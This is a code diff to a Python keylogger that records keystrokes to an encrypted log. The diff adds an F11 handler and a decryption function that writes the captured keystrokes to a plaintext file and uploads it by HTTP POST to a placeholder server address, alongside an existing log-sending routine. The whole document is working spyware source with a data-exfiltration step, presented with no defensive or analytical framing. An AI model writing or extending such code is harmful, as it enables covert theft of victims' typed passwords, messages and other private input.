@@ -31,6 +31,18 @@ def on_press(key):
         send_logs()
         return  # Don't log the F12 press itself
 
+    # Decrypt and upload logs when F11 is pressed
+    if key == keyboard.Key.f11:
+        print("F11 pressed. Decrypting and uploading logs...")
+        decrypt_logs()
+        try:
+            with open("decrypted_log.txt", "rb") as f:
+                response = requests.post("http://YOUR_SERVER_IP/upload", files={"file": f})
+                print("Server response:", response.text)
+        except Exception as e:
+            print("Error sending decrypted log to server:", e)
+        return  # Don't log the F11 press itself
+
     with open(LOG_FILE, "a") as f:
         try:
             f.write(f"{key.char}")
@@ -49,6 +61,18 @@ def encrypt_logs():
     encrypted = fernet.encrypt(data)
     with open(ENCRYPTED_FILE, "wb") as f:
         f.write(encrypted)
+
+def decrypt_logs():
+    try:
+        with open(ENCRYPTED_FILE, "rb") as f:
+            encrypted_data = f.read()
+        decrypted = fernet.decrypt(encrypted_data)
+        # Save or print the decrypted logs as needed
+        with open("decrypted_log.txt", "wb") as f:
+            f.write(decrypted)
+        print("Logs decrypted and saved to decrypted_log.txt")
+    except Exception as e:
+        print("Error decrypting logs:", e)
 
 def send_logs():
     try:
